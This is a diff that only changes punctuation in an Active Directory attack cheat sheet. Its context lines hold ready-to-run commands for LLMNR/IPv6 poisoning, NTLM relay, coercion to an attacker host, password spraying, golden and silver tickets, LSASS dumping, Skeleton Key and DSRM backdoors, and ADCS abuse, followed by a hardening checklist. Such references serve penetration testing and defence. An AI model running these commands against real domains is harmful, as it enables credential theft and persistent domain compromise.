@@ -162,7 +162,7 @@ Protected groups (SDProp targets): Account Operators, Administrators, Backup Ope
 BloodHound ingests AD data and maps attack paths graphically using graph theory (shortest path algorithms).
 
 ```bash
-# SharpHound collection — run on domain-joined machine
+# SharpHound collection: run on domain-joined machine
 SharpHound.exe -c All --zipfilename bloodhound.zip
 SharpHound.exe -c All,GPOLocalGroup --zipfilename bloodhound_full.zip
 
@@ -292,7 +292,7 @@ ldapdomaindump -u 'CORP\user' -p 'password' ldaps://192.168.1.10 -o /tmp/ldap/
 ldapdomaindump -u 'CORP\user' --ntlm ':NTLM_HASH' ldap://192.168.1.10 -o /tmp/ldap/
 
 # Output files: domain_users.json, domain_computers.json, domain_groups.json,
-# domain_trusts.json, domain_policy.json — plus HTML reports
+# domain_trusts.json, domain_policy.json, plus HTML reports
 ```
 
 ### CrackMapExec / NetExec Enumeration
@@ -346,7 +346,7 @@ gppdecrypt.rb [cpassword_value]
 Mechanism: When a hostname lookup fails DNS, Windows falls back to LLMNR (Link-Local Multicast Name Resolution) and NBT-NS broadcasts. An attacker on the same network responds to these broadcasts, causing the victim to authenticate to the attacker's machine and sending an NTLMv2 hash.
 
 ```bash
-# Responder — listen, poison LLMNR/NBT-NS, and capture NTLMv2 hashes
+# Responder: listen, poison LLMNR/NBT-NS, and capture NTLMv2 hashes
 responder -I eth0 -dwv
 # -d: DHCP injection
 # -w: Start WPAD rogue proxy
@@ -357,7 +357,7 @@ hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt
 hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 ntlmv2.txt
 
-# mitm6 — IPv6 DNS poisoning (works even when LLMNR/NBT-NS disabled)
+# mitm6: IPv6 DNS poisoning (works even when LLMNR/NBT-NS disabled)
 mitm6 -d corp.local
 # Combine with ntlmrelayx for LDAP relay (RBCD)
 impacket-ntlmrelayx -6 -t ldaps://DC01.corp.local -wh attacker-wpad.corp.local --delegate-access
@@ -372,7 +372,7 @@ impacket-ntlmrelayx -6 -t ldaps://DC01.corp.local -wh attacker-wpad.corp.local -
 Mechanism: Instead of cracking the captured NTLMv2 hash, relay the authentication attempt to another machine. If SMB signing is not required, the relay authenticates as the victim on the target.
 
 ```bash
-# Step 1: Edit Responder config — disable SMB and HTTP servers
+# Step 1: Edit Responder config; disable SMB and HTTP servers
 # /etc/responder/Responder.conf:
 #   SMB = Off
 #   HTTP = Off
@@ -405,7 +405,7 @@ python3 PetitPotam.py ATTACKER_IP DC01.corp.local
 Mechanism: Try one or a few passwords against many accounts. Avoids lockout by staying under the bad password threshold.
 
 ```bash
-# Kerbrute (fast, uses Kerberos pre-auth — less noise than SMB)
+# Kerbrute (fast, uses Kerberos pre-auth: less noise than SMB)
 kerbrute passwordspray -d corp.local --dc 192.168.1.10 users.txt 'Winter2024!'
 kerbrute userenum -d corp.local --dc 192.168.1.10 users.txt  # Username enumeration first
 
@@ -413,7 +413,7 @@ kerbrute userenum -d corp.local --dc 192.168.1.10 users.txt  # Username enumerat
 ldapdomaindump -u 'CORP\user' -p 'password' ldap://DC01 -o /tmp/
 # Or from OSINT: LinkedIn → username generator
 
-# DomainPasswordSpray (PowerShell — uses domain lockout policy automatically)
+# DomainPasswordSpray (PowerShell: uses domain lockout policy automatically)
 Import-Module DomainPasswordSpray.ps1
 Invoke-DomainPasswordSpray -UserList users.txt -Password 'Winter2024!' -OutFile spray_results.txt
 Invoke-DomainPasswordSpray -Password 'Spring2024!' -Delay 30 -Verbose  # Built-in lockout-aware delay
@@ -510,12 +510,12 @@ impacket-lookupsid corp.local/user:password@DC01.corp.local | grep "Domain SID"
 # ── Mimikatz Golden Ticket ───────────────────────────────────────────────────
 mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXXXXXXXX /krbtgt:KRBTGT_HASH /ptt
 # Options:
-# /id:500          — RID (500 = Administrator)
-# /groups:512,513,518,519,520  — Group RIDs (DA, DU, Schema Admins, EA, Group Policy Creator Owners)
-# /endin:600       — Ticket lifetime in minutes
-# /renewmax:10080  — Renewable lifetime in minutes
-# /ptt             — Pass the ticket into current session
-# /ticket:golden.kirbi  — Save to file instead of PTT
+# /id:500          : RID (500 = Administrator)
+# /groups:512,513,518,519,520  : Group RIDs (DA, DU, Schema Admins, EA, Group Policy Creator Owners)
+# /endin:600       : Ticket lifetime in minutes
+# /renewmax:10080  : Renewable lifetime in minutes
+# /ptt             : Pass the ticket into current session
+# /ticket:golden.kirbi  : Save to file instead of PTT
 
 # ── Impacket Golden Ticket ───────────────────────────────────────────────────
 impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXXXXX -domain corp.local Administrator
@@ -549,14 +549,14 @@ mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21
 # /service: service class (see below)
 
 # Common services for Silver Tickets:
-# cifs     — File share access (\\SERVER01\C$)
-# http     — IIS/web services
-# host     — Scheduled tasks, WMI, PowerShell remoting
-# ldap     — LDAP queries (DCSync if targeting DC)
-# mssql    — SQL Server
-# wsman    — WinRM (PowerShell remoting)
-# rpcss    — DCOM
-# krbtgt   — Effectively Golden Ticket territory
+# cifs     : File share access (\\SERVER01\C$)
+# http     : IIS/web services
+# host     : Scheduled tasks, WMI, PowerShell remoting
+# ldap     : LDAP queries (DCSync if targeting DC)
+# mssql    : SQL Server
+# wsman    : WinRM (PowerShell remoting)
+# rpcss    : DCOM
+# krbtgt   : Effectively Golden Ticket territory
 
 # ── Impacket ─────────────────────────────────────────────────────────────────
 impacket-ticketer -nthash SERVICE_HASH -domain-sid S-1-5-21-XXXXXX -domain corp.local -spn cifs/SERVER01.corp.local Administrator
@@ -714,7 +714,7 @@ nxc winrm 192.168.1.0/24 -u administrator -H NTLM_HASH
 
 # ── Mimikatz PtH ─────────────────────────────────────────────────────────────
 mimikatz # sekurlsa::pth /user:administrator /domain:corp.local /ntlm:HASH /run:cmd.exe
-# Spawns new process with stolen identity — use klist to verify Kerberos tickets
+# Spawns new process with stolen identity: use klist to verify Kerberos tickets
 
 # ── Evil-WinRM PtH ───────────────────────────────────────────────────────────
 evil-winrm -i TARGET01 -u administrator -H NTLM_HASH
@@ -729,12 +729,12 @@ evil-winrm -i TARGET01 -u administrator -H NTLM_HASH
 Convert an NTLM hash directly into a Kerberos TGT: avoids NTLM network traffic, bypasses NTLM blocking.
 
 ```bash
-# Mimikatz — spawns new process with Kerberos TGT
+# Mimikatz: spawns new process with Kerberos TGT
 mimikatz # sekurlsa::pth /user:administrator /domain:corp.local /ntlm:HASH /run:powershell.exe
 # In the new PS window, Kerberos tickets are requested automatically
 klist  # Verify TGT present
 
-# Rubeus — request TGT directly
+# Rubeus: request TGT directly
 Rubeus.exe asktgt /user:administrator /rc4:HASH /ptt
 Rubeus.exe asktgt /user:administrator /aes256:AES_HASH /ptt  # AES is stealthier
 Rubeus.exe asktgt /user:administrator /rc4:HASH /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
@@ -781,7 +781,7 @@ nxc smb TARGET01 -u admin -p password --exec-method smbexec -x "whoami"
 ### WinRM / Evil-WinRM (T1021.006)
 
 ```bash
-# Evil-WinRM — feature-rich WinRM shell
+# Evil-WinRM: feature-rich WinRM shell
 evil-winrm -i TARGET01 -u administrator -p password
 evil-winrm -i TARGET01 -u administrator -H NTLM_HASH
 
@@ -826,11 +826,11 @@ LSASS (Local Security Authority Subsystem Service) stores credentials for intera
 
 ```bash
 # ── LOL Binaries (avoid bringing own tools) ──────────────────────────────────
-# comsvcs.dll MiniDump — no external tools, common false positive for AV
+# comsvcs.dll MiniDump: no external tools, common false positive for AV
 $lsass_pid = (Get-Process lsass).Id
 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $lsass_pid C:\Windows\Temp\lsass.dmp full
 
-# ProcDump (signed Microsoft tool — often bypass AV)
+# ProcDump (signed Microsoft tool, often bypass AV)
 procdump.exe -ma lsass.exe C:\Windows\Temp\lsass.dmp
 procdump64.exe -ma lsass.exe C:\Windows\Temp\lsass.dmp
 
@@ -945,7 +945,7 @@ Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity backdo
 Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" `
   -PrincipalIdentity backdoor_user -Rights All -Verbose
 
-# SDProp runs every 60 min — then backdoor_user has GenericAll on all protected groups
+# SDProp runs every 60 min: then backdoor_user has GenericAll on all protected groups
 # Verify
 Get-DomainObjectAcl "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -ResolveGUIDs | where {$_.SecurityIdentifier -match "backdoor_user_SID"}
 
@@ -984,7 +984,7 @@ Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name 'Security Pa
 ### Skeleton Key (T1556.001)
 
 ```bash
-# Patches LSASS on the DC — accepts master password for ALL accounts
+# Patches LSASS on the DC: accepts master password for ALL accounts
 # Does not replace existing passwords; both work simultaneously
 # Requires DA, reboot of DC removes it
 mimikatz # privilege::debug
@@ -1058,7 +1058,7 @@ ntdsutil "set dsrm password" "reset password on server DC01" quit quit
 New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
 # Value 0: DSRM only in DSRM mode
 # Value 1: DSRM if DC services stopped
-# Value 2: DSRM always (dangerous — enables local admin backdoor)
+# Value 2: DSRM always (dangerous, enables local admin backdoor)
 
 # With PtH using DSRM hash
 impacket-secretsdump -sam -system corp.local/administrator@DC01  # Get DSRM hash
@@ -1140,7 +1140,7 @@ Condition: CA is configured with EDITF_ATTRIBUTESUBJECTALTNAME2 flag; allows any
 certipy find -u user@corp.local -p password -dc-ip 192.168.1.10
 # Look for: UserSpecifiedSAN: Enabled
 
-# Exploit — request any template with admin UPN
+# Exploit: request any template with admin UPN
 certipy req -ca 'corp-CA' -template User -upn administrator@corp.local -u user@corp.local -p password
 certipy auth -pfx administrator.pfx
 ```
@@ -1173,7 +1173,7 @@ python3 printerbug.py corp.local/user:password@DC01.corp.local ATTACKER_IP
 # OR
 python3 PetitPotam.py ATTACKER_IP DC01.corp.local  # unauthenticated if unpatched
 
-# Step 3: Certificate issued for DC machine account — get DC's TGT
+# Step 3: Certificate issued for DC machine account; get DC's TGT
 # Output from ntlmrelayx: base64 certificate
 certipy auth -pfx DC01.pfx -dc-ip 192.168.1.10  # Authenticate as DC01$
 # With DC's TGT → DCSync
@@ -1230,8 +1230,8 @@ mimikatz # kerberos::golden /user:Administrator /domain:child.corp.local /sid:CH
 
 ```bash
 # Check if SID filtering is enabled on a trust
-# netdom trust child.corp.local /domain:corp.local /quarantine:Yes  — enables SID filtering
-# netdom trust child.corp.local /domain:corp.local /quarantine:No   — disables SID filtering
+# netdom trust child.corp.local /domain:corp.local /quarantine:Yes  : enables SID filtering
+# netdom trust child.corp.local /domain:corp.local /quarantine:No   : disables SID filtering
 
 # Check via PowerShell
 Get-ADTrust -Filter * | select Name, SIDFilteringQuarantined, SIDFilteringForestAware
@@ -1335,7 +1335,7 @@ Get-ADObject -SearchBase "CN=Shadow Principal Configuration,CN=Services,CN=Confi
 [ ] Migrate service accounts with SPNs to gMSA
 [ ] Set msDS-SupportedEncryptionTypes = 24 (AES only) on service accounts
 [ ] Disable Kerberos pre-auth only where absolutely required (audit regularly)
-[ ] Review and restrict unconstrained delegation — remove where not needed
+[ ] Review and restrict unconstrained delegation: remove where not needed
 [ ] Enable ADCS audit logging (Events 4886/4887)
 [ ] Audit CA template ACLs with Certipy regularly
 [ ] Implement Tiered Administration Model (Tier 0/1/2 isolation)
